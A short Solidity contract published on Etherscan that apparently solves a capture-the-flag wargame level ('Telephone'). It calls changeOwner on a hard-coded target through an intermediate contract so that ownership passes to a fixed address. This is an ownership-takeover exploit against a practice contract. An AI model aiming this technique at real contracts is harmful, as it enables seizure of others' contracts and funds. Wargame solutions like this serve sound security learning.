/**
 *Submitted for verification at Etherscan.io on 2022-05-04
*/

// File: github/Level4.sol



pragma solidity 0.8.13;

interface TelephoneInter{
    function changeOwner(address _owner) external;
}

contract Level4 {

    constructor() public {}

    function changeOwner() public{
        TelephoneInter(0x09D99975fCb4162AD8711cDf1293aB4Fb17842B9).changeOwner(0xFf95dED47511314daAB513d36952F582e63Ce34a);
    }

}